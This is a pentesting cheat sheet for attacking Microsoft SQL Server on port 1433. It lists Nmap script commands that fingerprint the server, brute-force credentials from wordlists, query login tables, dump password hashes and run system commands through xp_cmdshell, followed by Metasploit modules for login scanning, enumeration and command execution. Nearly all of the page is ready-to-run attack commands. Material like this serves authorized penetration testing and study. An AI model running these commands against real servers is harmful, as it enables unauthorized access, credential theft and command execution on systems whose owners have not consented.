---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
---

# 1433 - MSSQL

## Nmap Scripts

```bash
# Enum version/info mssql
sudo nmap -p1433 --script=ms-sql-info $IP

# Enum target/domain/netbios name
sudo nmap -p1433 --script=ms-sql-ntlm-info --script-args mssql.instance-port=1433 $IP

# Enum mssql for empty password
sudo nmap -p1433 --script=ms-sql-empty-password $IP

# Bruteforcing user/password
sudo nmap -p1433 --script=ms-sql-brute --script-args userdb=/wordlists/user.txt,passdb=/wordlists/password.txt $IP

# Query the login users with AUTHENTICATION
sudo nmap -p1433 --script=ms-sql-query --script-args mssql.username=administrator,mssql.password=password123,ms-sql-query.query="SELECT * FROM master..syslogins" -oN output.txt $IP

# Query the sysusers with AUTHENTICATION
sudo nmap -p1433 --script=ms-sql-query --script-args mssql.username=administrator,mssql.password=password123,ms-sql-query.query="SELECT * FROM master..sysusers" -oN output.txt $IP

# Dump hashes with AUTHENTICATION
sudo nmap -p1433 --script=ms-sql-dump-hashes --script-args mssql.username=administrator,mssql.password=password123 $IP

# Execute command with AUTHENTICATION
sudo nmap -p1433 --script=ms-sql-xp-cmdshell --script-args mssql.username=administrator,mssql.password=password123,ms-sql-xp-cmdshell.cmd="ipconfig" $IP

# MSSQL allscripts
sudo nmap -sV -p1433 --script=ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args=mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER $IP
```

## MSFconsole

```bash
auxiliary/scanner/mssql/mssql_login
auxiliary/admin/mssql/mssql_enum
auxiliary/admin/mssql/mssql_enum_sql_logins
auxiliary/admin/mssql/mssql_exec
auxiliary/admin/mssql/mssql_enum_domains_accounts
```
